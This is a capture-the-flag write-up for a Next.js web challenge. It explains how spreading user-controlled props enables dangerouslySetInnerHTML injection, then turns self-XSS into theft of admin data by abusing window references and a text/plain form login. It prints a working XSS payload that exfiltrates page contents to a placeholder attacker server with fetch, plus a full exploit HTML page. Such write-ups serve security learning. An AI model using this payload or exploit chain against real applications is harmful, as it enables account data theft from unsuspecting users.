# React2XSS Writeup

## Challenge Overview

**Challenge:** React2XSS  
**Category:** Web (XSS)  
**Description:** "I vibe coded a Next.js application. Hopefully it doesn't have any vulnerabilities"

## Initial Analysis

Upon extracting the challenge files, I found a Next.js application with the following key components:

### Key Files Analyzed

1. **app/page.tsx** - Main profile page that displays user information
2. **app/account/settings/page.tsx** - Settings page for updating profile
3. **app/api/profile/update/route.ts** - API endpoint for updating profile data
4. **lib/bot.ts** - The admin bot that visits reported URLs
5. **lib/db.ts** - Database configuration showing admin has FLAG in bio field

### The Vulnerability

In `app/page.tsx`, I found this critical line:

```tsx
<progress max={100} value={viewCount} {...userData.viewProgressStyle} />
```

The `viewProgressStyle` is user-controlled data from the database. When updating the profile via `/api/profile/update`, the code merges user input into `userData`:

```ts
const updatedData = {
  ...userData,
  ...dynamicFields
};
```

This means we can inject arbitrary properties into `userData.viewProgressStyle`. React's JSX spread operator allows us to inject **any** prop, including `dangerouslySetInnerHTML`:

```js
{
  dangerouslySetInnerHTML: {
    __html: "<img src=x onerror='alert(1)'>"
  }
}
```

This creates a **Self-XSS** - we can only execute JavaScript on our own profile page when logged in as ourselves.

## The Challenge: From Self-XSS to Admin XSS

The goal is to steal the admin's flag. Looking at the bot (`lib/bot.ts`):

```ts
export async function visitUrl(urlToVisit: string): Promise<boolean> {
  // ...
  await page.goto(`${BOT_CONFIG.APPURL}/login`, { waitUntil: 'load' });
  await page.fill('input[id="username"]', ADMIN_USERNAME);
  await page.fill('input[id="password"]', adminUser.password);
  await page.click('button[type="submit"]');
  await sleep(BOT_CONFIG.WAIT_AFTER_LOGIN);
  
  await page.goto(urlToVisit, { waitUntil: 'load' });
  // ...
}
```

The bot:
1. Logs in as admin
2. Visits the URL we report

### Key Insight: Same-Origin Window References

When a page opens another window using `window.open()`, both windows share the **same origin** if they're on the same domain. This means:
- `window.open('http://localhost:3000/api/profile', 'winB')` creates a window reference
- Later, `window.open('', 'winB')` retrieves that SAME window
- We can read `winB.document.body.innerText` if same-origin!

### The Critical Bug: Bot Uses `http://localhost:3000`

Looking at the bot configuration:
```ts
BOT_CONFIG: {
  APPURL: process.env.APPURL || 'http://localhost:3000',
  // ...
}
```

The bot logs in at `http://localhost:3000/login` (internally), NOT at the public `chal.polyuctf.com:46564`! This was the key breakthrough.

## Exploit Chain

### Step 1: Register Attacker Account

Register an account and set up the XSS payload in our profile:

```js
const payload = {
  dangerouslySetInnerHTML: {
    __html: `<img src=x onerror="
      let w = window.open('', 'winB');
      let t = w.document.documentElement.outerHTML;
      fetch('https://attacker-server/flag?data=' + btoa(t));
    ">`
  }
};
```

This payload will:
1. Get a reference to window named 'winB'
2. Read its HTML content
3. Base64 encode and exfiltrate to our server

### Step 2: Create the Exploit Page

Create `exploit.html`:

```html
<!DOCTYPE html>
<html>
<body>
  <form id="loginForm" action="http://localhost:3000/api/auth/login" 
        method="POST" target="winC" enctype="text/plain">
    <input type="hidden" name='{"username":"attacker","password":"password123","a":"' 
           value='"}'>
  </form>
  <script>
    // 1. Open admin's profile in winB (bot is logged in as admin)
    let winB = window.open('http://localhost:3000/api/profile', 'winB');
    
    setTimeout(() => {
      // 2. Log bot into OUR account (attacker)
      document.getElementById('loginForm').submit();
      
      setTimeout(() => {
        // 3. Navigate to homepage, triggering our XSS
        window.open('http://localhost:3000/', 'winC');
      }, 500);
    }, 500);
  </script>
</body>
</html>
```

**Why this works:**
1. **First `window.open`**: Opens `/api/profile` as admin. The JSON response contains the flag.
2. **Form submission**: Uses `text/plain` encoding with JSON trickery to login as attacker
3. **Second `window.open`**: Opens homepage as attacker. Our XSS runs and reads `winB` (still showing admin's profile!)

### Step 3: Submit to Bot

Report the exploit URL to the admin bot via the report page. The bot:
1. Is already logged in as admin
2. Visits our exploit page
3. Exploit opens admin profile → stores in `winB`
4. Exploit logs bot into attacker account
5. Exploit navigates to attacker's homepage
6. XSS triggers, reads `winB.document`, exfiltrates flag!

## The Flag

After successfully executing the exploit chain, we received the admin's profile data:

```json
{
  "id": 1,
  "username": "admin",
  "bio": "PUCTF26{35c41471n9_531f_x55_15_5up32_fun_xhiKFbqkA8ieogcxCabmRIaxNCneO9qr}",
  "website": "http://example.com",
  "location": "NuttyShell"
}
```

**Flag:** `PUCTF26{35c41471n9_531f_x55_15_5up32_fun_xhiKFbqkA8ieogcxCabmRIaxNCneO9qr}`

## Key Takeaways

1. **React JSX Spread Danger**: Spreading user-controlled objects into JSX props can lead to `dangerouslySetInnerHTML` injection

2. **Self-XSS Escalation**: Same-origin window references allow reading data across windows when you control navigation timing

3. **Internal vs External URLs**: The bot used `localhost:3000` internally, which was crucial for the exploit to work (same-origin policy)

4. **Form Encoding Trick**: Using `enctype="text/plain"` with carefully crafted input names allows sending arbitrary JSON payloads via HTML forms

5. **Timing is Everything**: The exploit requires precise timing - open admin window first, then login as attacker, then trigger XSS to read the still-open admin window

## Tools Used

- Playwright (for automation and testing)
- localhost.run (for tunneling)
- Python HTTP server (for hosting exploit)
- Base64 decoding (for extracting flag from exfiltrated data)
